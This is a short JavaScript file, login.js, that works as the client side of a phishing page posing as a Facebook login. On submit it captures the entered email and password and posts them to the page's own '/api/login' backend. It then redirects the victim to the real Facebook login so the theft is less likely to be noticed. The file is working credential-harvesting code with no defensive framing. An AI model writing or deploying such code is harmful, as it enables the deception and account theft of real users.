// login.js

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const formData = new FormData(e.target);
  const data = {
    email: formData.get('email'),
    password: formData.get('password')
  };

  try {
    // Send data to your backend API
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    // After sending, redirect to the real Facebook login
    window.location.href = 'https://www.facebook.com/login/';
  } catch (error) {
    console.error('Login submission failed:', error);
    alert('Failed to submit login. Please try again.');
  }
});
